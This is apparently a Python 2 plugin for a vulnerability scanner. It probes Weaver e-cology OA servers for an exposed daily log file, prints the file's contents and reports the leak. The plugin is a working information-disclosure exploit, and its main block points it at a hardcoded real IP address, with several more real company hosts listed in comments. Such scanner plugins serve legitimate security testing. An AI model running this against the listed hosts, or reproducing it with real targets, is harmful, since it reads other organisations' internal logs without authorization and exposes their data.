#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = e-cology log leaked
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-046804

import re
import md5
import time
import datetime

def assign(service, arg):
    if service == 'weaver_e-cology':
        return True, arg

def audit(arg):
    yesterday = str(datetime.date.today() - datetime.timedelta(days=1))
    payload = "log/ecology_"+yesterday.replace('-','')+".log"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    print res
    if code == 200 and yesterday in res and 'ERROR' in res and 'weaver.system.WfUrgerTimer' in res:
        security_warning(target+': log is leaked')

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_e-cology', 'http://59.49.15.130:82/')[1])
    #audit(assign('weaver_e-cology', 'http://58.62.113.250:8088/')[1])
    #audit(assign('weaver_e-cology', 'http://oa.baixiangfood.com/')[1])
    #audit(assign('weaver_e-cology', 'http://oa.hbxx.com.cn/')[1])